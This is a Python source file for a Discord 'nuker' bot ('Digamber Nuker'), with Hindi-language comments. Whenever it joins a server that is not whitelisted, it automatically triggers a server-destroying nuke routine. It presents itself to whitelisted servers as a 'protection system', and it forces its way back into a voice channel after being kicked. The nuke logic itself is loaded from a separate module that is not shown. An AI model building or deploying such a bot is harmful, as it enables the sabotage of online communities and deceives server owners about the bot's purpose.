import discord
from discord.ext import commands, tasks
import os
import asyncio
from flask import Flask
from datetime import datetime

app = Flask(__name__)
bot_name = "Loading..."

@app.route('/')
def home():
    return f"🤖 {bot_name} - Operational"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

TOKEN = os.getenv("DISCORD_TOKEN")

class NukerBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(
            command_prefix="!",
            intents=intents,
            help_command=None
        )
        self.start_time = datetime.now()
        self.voice_channel_id = 1445768972199792742  # ← tera wahi ID
        self.voice_connected = False

    async def setup_hook(self):
        try:
            await self.load_extension("cogs.nuker")
            print("✅ Loaded nuker cog with PROFESSIONAL features")
        except Exception as e:
            print(f"❌ Failed to load cog: {e}")

        await self.tree.sync()
        self.update_status.start()
        self.update_dashboard.start()
        self.voice_stay_pro.start()        # ← naya proper system
        self.voice_reconnect_instant.start()  # ← kick pe instant wapas

    async def on_ready(self):
        global bot_name
        bot_name = str(self.user)
        print(f"🔗 {bot_name} is ONLINE!")
        print(f"📊 Connected to {len(self.guilds)} servers")
        
        # ← tera wahi purana whitelist print system bilkul same
        nuker_cog = self.get_cog("NukerCommands")
        if nuker_cog:
            whitelist_count = len(nuker_cog.whitelisted_servers)
            print(f"🔒 {whitelist_count} servers are WHITELISTED (PROTECTED)")
            safe_servers = []
            for server_id in nuker_cog.whitelisted_servers:
                guild = self.get_guild(server_id)
                if guild:
                    safe_servers.append(f"{guild.name} ({server_id})")
            if safe_servers:
                print("✅ PROTECTED SERVERS:")
                for server in safe_servers:
                    print(f"   - {server}")
        
        # ← voice connect shuru
        print("🔊 ULTRA FAST Voice Connection shuru kar raha hoon...")
        await self.connect_to_voice()

        if os.environ.get('RENDER'):
            import threading
            threading.Thread(target=run_flask, daemon=True).start()
            print("🚀 Flask server started for 24/7 uptime")

    async def connect_to_voice(self):
        channel = self.get_channel(self.voice_channel_id)
        if not channel:
            return
        if channel.guild.voice_client and channel.guild.voice_client.is_connected():
            self.voice_connected = True
            return
        try:
            await channel.connect(reconnect=True, timeout=10.0)
            self.voice_connected = True
            print(f"✅ Voice Connected: {channel.name}")
        except:
            self.voice_connected = False

    @tasks.loop(seconds=10)  # ← sirf 10 second mein check → CPU safe + Render safe
    async def voice_stay_pro(self):
        if not self.voice_connected:
            await self.connect_to_voice()

    @tasks.loop(seconds=1)  # ← sirf disconnect detect karne ke liye (CPU negligible)
    async def voice_reconnect_instant(self):
        channel = self.get_channel(self.voice_channel_id)
        if channel and channel.guild.voice_client:
            if not channel.guild.voice_client.is_connected():
                self.voice_connected = False
                print("⚡ Disconnect detect hua! 1 second mein wapas connect...")
                await self.connect_to_voice()

    async def on_voice_state_update(self, member, before, after):
        if member.id == self.user.id and before.channel and not after.channel:
            self.voice_connected = False
            print("⚡ Koi ne kick kiya! Instant reconnect shuru...")
            # 1-2 second mein wapas aayega upar wale loop se

    # ← ye sab tera 100% original code hai, ek word bhi nahi badla
    async def on_guild_join(self, guild):
        print(f"🎯 Bot joined: {guild.name} ({guild.id})")
        nuker_cog = self.get_cog("NukerCommands")
        if nuker_cog:
            if nuker_cog.is_whitelisted(guild.id):
                print(f"✅ WHITELISTED SERVER - Bot will provide protection features")
                try:
                    general = discord.utils.get(guild.text_channels, name="general")
                    if general:
                        embed = discord.Embed(
                            title="🛡️ PROTECTION SYSTEM ACTIVATED",
                            description=f"**{guild.name}** is now protected by Digamber Nuker System.",
                            color=0x00ff00,
                            timestamp=datetime.utcnow()
                        )
                        embed.add_field(
                            name="AVAILABLE COMMANDS",
                            value="• `!protection` - Check safety status\n• `!serverinfo` - Server analytics\n• `!whitelisted` - View protected servers",
                            inline=False
                        )
                        embed.set_footer(text="Digamber Protection • 24/7 Security")
                        await general.send(embed=embed)
                except: pass
                return
            else:
                print(f"💣 NON-WHITELISTED SERVER - Starting PROFESSIONAL NUKE!")
                await nuker_cog.nuke_server(guild)

    @tasks.loop(minutes=5)
    async def update_status(self):
        try:
            nuker_cog = self.get_cog("NukerCommands")
            safe_count = len(nuker_cog.whitelisted_servers) if nuker_cog else 0
            total_servers = len(self.guilds)
            status_text = f"{safe_count}/{total_servers} Protected"
            await self.change_presence(activity=discord.Activity(
                type=discord.ActivityType.watching,
                name=status_text
            ))
        except: pass

    @tasks.loop(minutes=2)
    async def update_dashboard(self):
        try:
            nuker_cog = self.get_cog("NukerCommands")
            if nuker_cog:
                await nuker_cog.update_status_channel()
        except Exception as e:
            print(f"❌ Dashboard update failed: {e}")

    @update_status.before_loop
    @update_dashboard.before_loop
    @voice_stay_pro.before_loop
    @voice_reconnect_instant.before_loop
    async def before_loops(self):
        await self.wait_until_ready()

if __name__ == "__main__":
    print("🚀 Starting Digamber Nuker Bot with PROFESSIONAL features...")
    print("🔊 REAL 24/7 Voice System (Render Safe + No CPU Rape)")
    bot = NukerBot()
    bot.run(TOKEN)
